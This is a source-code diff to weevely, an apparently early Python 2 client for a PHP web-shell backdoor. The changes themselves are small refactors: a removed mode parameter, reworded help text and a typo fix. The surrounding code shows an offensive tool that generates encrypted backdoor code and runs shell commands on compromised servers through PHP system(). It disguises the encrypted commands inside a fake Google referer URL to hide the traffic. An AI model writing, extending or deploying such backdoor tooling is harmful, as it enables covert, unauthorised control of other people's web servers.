@@ -92,7 +92,7 @@ class weevely:
 
       if moderun=='c':       
 	try:
-	  print self.host.execute(cmnd, 0)
+	  print self.host.execute(cmnd)
 	except Exception, e:
 	  #print '! Command execution failed: ' + str(e) + '.'
 	  raise
@@ -114,16 +114,16 @@ class weevely:
     print """+ Generate backdoor crypted code.
 +  	./weevely -g -o <filepath> -p <password>
 +      
-+ Exec single command on remote server.
++ Execute shell command.
 +  	./weevely -c <command> -u <url> -p <password>
 +      
-+ Start terminal session on remote server.
++ Start terminal session.
 +  	./weevely -t -u <url> -p <password>
 +
-+ List local PHP modules details (available: """ + ", ".join(self.modules) + """).
++ List plugins modules (available: """ + ", ".join(self.modules) + """).
 +  	./weevely -l
 +
-+ Evaluate local PHP modules on remote server, specifing arguments.
++ Execute plugin on remote server using arguments.
 +  	./weevely -m <module>::<firstarg>::..::<Narg> -u <url> -p <password>"""
     
   def banner(self):
@@ -182,7 +182,7 @@ class weevely:
       toinject = toinject + f.read()
       
       try:
-	ret = self.host.executephp(toinject, 1)
+	ret = self.host.execute_php(toinject)
       except Exception, e:
 	#print '! Module execution failed: ' + str(e) + '.'
 	raise
@@ -198,10 +198,14 @@ class weevely:
       print '+ Module:', m['name']
       if m.has_key('OS'):
 	print '+ Supported OSs:', m['OS']
-      if m.has_key('description'):
-	print '+ Description:', m['description']
+      
       if m.has_key('arguments'):
-	print '+ Take', str(len(m['arguments'])), 'argument/s:', ','.join(m['arguments']) + '.'
+	print '+ Usage: ./weevely -m ' + m['name'] + "::<" + '>::<'.join(m['arguments']) + '>' + ' -u <url> -p <password>'
+      else:
+	print '+ Usage: ./weevely -m ' + m['name'] + ' -u <url> -p <password>'
+	
+      if m.has_key('description'):
+	print '+ Description:', m['description'].strip()
 
       print '+'
   
@@ -266,14 +270,14 @@ class host():
     e2 = None
     
     try:
-      ret = self.execute("echo " + self.pwd, 0)
+      ret = self.execute("echo " + self.pwd)
     except Exception, e:
       ret = False
     if self.pwd != ret:
       ret = False
     
     try:
-      ret2 = self.execute_php("echo PHP_OS;", 1)
+      ret2 = self.execute_php("echo PHP_OS;")
     except Exception, e2:
       ret2 = False
     if not ret2:
@@ -284,17 +288,15 @@ class host():
 
     
 	
-  def execute_php(self,cmnd,mode=0):
+  def execute_php(self,cmnd):
     
     cmnd=cmnd.strip()
     cmdstr=crypt(cmnd,self.pwd[2:])
-    #self.genRefUrl(cmdstr, mode)
     
     
     refurl='http://www.google.com/urla?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
     try: 
       ret=self.execHTTPGet(refurl)
-      print ret
       # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
     
     except urllib2.URLError, e:
@@ -304,15 +306,15 @@ class host():
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('request doesn\'t produce a valid respond, check password or url')
+	raise Exception('request doesn\'t produce a valid response, check password or url')
       else:
 	return founded[0].strip()
 
   
-  def execute(self, cmnd, mode=0):
+  def execute(self, cmnd):
     #cmnd="exec('" + cmnd.strip() + "');"
     cmnd="@system('" + cmnd + " 2>&1');"
-    return self.execute_php(cmnd,mode=0)
+    return self.execute_php(cmnd)
     
   def execHTTPGet(self, refurl):
     req = urllib2.Request(self.url)
@@ -325,7 +327,7 @@ class host():
     ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
     msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
     
-  def genRefUrl(self,cmndstr,mode):
+  def genRefUrl(self,cmndstr):
     
     pwd=self.pwd
     
@@ -352,8 +354,6 @@ class host():
       newparams += keys[1] + '=' + cmndstr + '&'
       distance.append(abs(len(values[1]) - len(cmndstr)))
       
-      newparams += keys[2] + '=' + str(mode)
-      distance.append(abs(len(values[2]) - len(str(mode))))
     
     
       newurl = url.geturl().replace(params,newparams)
